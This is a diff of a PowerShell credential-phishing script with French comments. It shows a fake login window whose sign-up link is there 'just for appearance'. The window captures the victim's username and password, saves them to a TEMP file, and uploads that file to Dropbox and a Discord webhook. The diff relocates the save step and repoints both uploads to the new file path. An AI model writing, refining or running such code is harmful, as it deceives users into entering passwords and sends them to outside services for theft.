@@ -1,3 +1,6 @@
+# Ajoute ça au début du script
+$FileName = "credentials.txt"
+
 function Get-Creds {
     Add-Type -AssemblyName PresentationCore,PresentationFramework,WindowsBase
     
@@ -118,24 +121,13 @@ function Get-Creds {
                 Username = $usernameBox.Text
                 Password = $passwordBox.Password
             }
-            
-            # Sauvegarder dans un fichier local
-            $filePath = "$env:TMP\credentials.txt"
-            $credString = "Username: $($usernameBox.Text)`nPassword: $($passwordBox.Password)"
-            $credString | Out-File -FilePath $filePath -Encoding UTF8 -Force
-            Write-Host "Credentials sauvegardés dans: $filePath" -ForegroundColor Green
-            
             $window.Close()
         }
     })
     
-    $signUpLink.Add_Click({
-        # Juste pour l'apparence, ne rien faire
-    })
+    $signUpLink.Add_Click({})
     
-    # Focus sur le premier champ
     $usernameBox.Focus() | Out-Null
-    
     $window.ShowDialog() | Out-Null
     
     if ($script:result) {
@@ -221,11 +213,21 @@ Write-Host "DEBUG: Credentials obtenues, suite du script..." -ForegroundColor Ye
 Write-Host "Username: $($creds.Username)" -ForegroundColor Yellow
 Write-Host "Password: $($creds.Password)" -ForegroundColor Yellow
 
-#------------------------------------------------------------------------------------------------------------------------------------
+#----------------------------------------------------------------------------------------------------
+# SAUVEGARDE DES CREDENTIALS DANS TEMP
 
-echo $creds >> $env:TMP\$FileName
+$filePath = "$env:TEMP\$FileName"
 
-#------------------------------------------------------------------------------------------------------------------------------------
+try {
+    $credString = "Username: $($creds.Username)`r`nPassword: $($creds.Password)"
+    $credString | Out-File -FilePath $filePath -Encoding UTF8 -Force
+    Write-Host "Credentials sauvegardés dans: $filePath" -ForegroundColor Green
+}
+catch {
+    Write-Host "Erreur lors de la sauvegarde: $_" -ForegroundColor Red
+}
+
+#----------------------------------------------------------------------------------------------------
 
 function DropBox-Upload {
 
@@ -247,7 +249,7 @@ $headers.Add("Content-Type", 'application/octet-stream')
 Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
 }
 
-if (-not ([string]::IsNullOrEmpty($db))){DropBox-Upload -f $env:TMP\$FileName}
+if (-not ([string]::IsNullOrEmpty($db))){DropBox-Upload -f $filePath}
 
 #------------------------------------------------------------------------------------------------------------------------------------
 
@@ -274,7 +276,7 @@ Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -B
 if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
 }
 
-if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file $env:TMP\$FileName}
+if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file $filePath}
 
 #------------------------------------------------------------------------------------------------------------------------------------
 
